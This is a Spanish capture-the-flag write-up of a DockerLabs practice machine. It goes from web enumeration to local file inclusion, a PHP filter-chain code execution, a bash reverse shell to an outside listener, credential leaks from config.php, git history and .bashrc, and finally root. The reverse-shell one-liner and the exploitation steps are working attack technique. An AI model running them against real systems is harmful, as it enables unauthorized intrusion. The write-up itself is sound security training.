# Report — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** Tluisillo_o  
**Fecha de creación:** 20/10/2024  
**Técnicas:** Gobuster · LFI · Wfuzz · PHP Filter Chain · Reverse Shell · MySQL Enumeration · Git Leak · Information Disclosure

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Explotación LFI](#3-explotación-lfi)
4. [PHP Filter Chain — RCE](#4-php-filter-chain--rce)
5. [Reverse Shell](#5-reverse-shell)
6. [Enumeración MySQL](#6-enumeración-mysql)
7. [Git Leak y obtención de credenciales](#7-git-leak-y-obtención-de-credenciales)
8. [Escalada final a root](#8-escalada-final-a-root)
9. [Lección aprendida](#9-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh report.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
3306/tcp open mysql
```

Servicios detectados:

```text
Apache httpd
MySQL/MariaDB
OpenSSH
```

---

## 2. Enumeración web

Accedemos al servidor web:

```text
http://172.17.0.2
```

La página redirige automáticamente al dominio:

```text
realgob.dl
```

Lo añadimos a `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
172.17.0.2 realgob.dl
```

Enumeramos directorios:

```bash
gobuster dir -u http://realgob.dl \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/about.php
/contacto.php
/desarrollo/
```

La máquina puede resolverse de varias maneras, aunque utilizaremos la vulnerabilidad **LFI**.

---

## 3. Explotación LFI

Utilizamos `wfuzz` para enumerar parámetros vulnerables:

```bash
wfuzz -c --hw 0 \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
"http://realgob.dl/about.php?FUZZ=/etc/passwd"
```

Resultado:

```text
file
```

Probamos el parámetro vulnerable:

```text
http://realgob.dl/about.php?file=/etc/passwd
```

Resultado:

```text
root:x:0:0:root:/root:/bin/bash
...
```

La aplicación es vulnerable a **Local File Inclusion (LFI)**.

---

## 4. PHP Filter Chain — RCE

Utilizamos la herramienta:

```text
php_filter_chain_generator
```

La herramienta permite transformar la vulnerabilidad LFI en ejecución remota de comandos.

Generamos una cadena maliciosa para ejecutar comandos arbitrarios.

Ahora podremos ejecutar comandos desde el parámetro vulnerable.

---

## 5. Reverse Shell

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Generamos una reverse shell Bash:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.26/443 0>&1'
```

La URL utilizada:

```text
http://realgob.dl/about.php?cmd=COMANDO&file=PAYLOAD_GENERADO
```

Obtenemos acceso remoto:

```bash
whoami
www-data
```

---

## 6. Enumeración MySQL

Exploramos el directorio web:

```bash
cd /var/www/html
ls -la
```

Encontramos:

```text
config.php
```

Leemos el archivo:

```bash
cat config.php
```

Resultado:

```php
$servername = "localhost";
$username = "root";
$password = "lacontrasmapoderosadetodas";
$dbname = "GOB_BD";
```

Accedemos a MariaDB:

```bash
mysql -u root -placontrasmapoderosadetodas
```

Listamos bases de datos:

```sql
SHOW DATABASES;
```

Resultado:

```text
GOB_BD
information_schema
mysql
noticias
performance_schema
sys
```

Seleccionamos la base de datos:

```sql
USE GOB_BD;
```

Listamos tablas:

```sql
SHOW TABLES;
```

Resultado:

```text
transacciones
users
```

Mostramos usuarios:

```sql
SELECT * FROM users;
```

La tabla contiene usuarios, correos y hashes bcrypt.

---

## 7. Git Leak y obtención de credenciales

Exploramos el directorio:

```bash
cd /var/www/html/desarrollo
ls -la
```

Encontramos:

```text
.git
```

Intentamos revisar logs Git:

```bash
git log
```

Resultado:

```text
fatal: detected dubious ownership
```

Corregimos el problema:

```bash
export HOME=/tmp
git config --global --add safe.directory /var/www/html/desarrollo/.git
```

Ejecutamos nuevamente:

```bash
git log
```

Resultado relevante:

```text
Acceso a Remote Management
```

Inspeccionamos el commit:

```bash
git show 0baffeec1777f9fdfe201c447dcbc37f10ce1dafa
```

Resultado:

```text
Nueva contraseña: SFR0L...
```

Obtenemos una contraseña válida para el usuario:

```text
adm
```

Cambiamos de usuario:

```bash
su adm
```

Exploramos el directorio personal:

```bash
ls -la
```

Encontramos:

```text
.bashrc
```

Leemos el contenido:

```bash
cat .bashrc
```

Resultado:

```bash
export MY_PASS='64 6f 63 6b 65 72 6c 61 62 73 34 75'
```

Decodificamos el valor hexadecimal:

```text
dockerlabs4u
```

---

## 8. Escalada final a root

Probamos la contraseña obtenida con el usuario root:

```bash
su root
```

Contraseña:

```text
dockerlabs4u
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 9. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Local File Inclusion | Lectura arbitraria de archivos |
| PHP Filter Chain | Ejecución remota de comandos |
| Reverse Shell Bash | Acceso interactivo |
| Credenciales expuestas en config.php | Acceso a base de datos |
| Git logs accesibles | Filtración de secretos |
| Contraseña almacenada en `.bashrc` | Escalada a root |

**Para defenderse:**

- Validar correctamente parámetros de inclusión.
- Restringir acceso a archivos sensibles.
- No almacenar credenciales en repositorios Git.
- Proteger configuraciones y secretos del sistema.
- Aplicar segmentación de privilegios y rotación de contraseñas.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
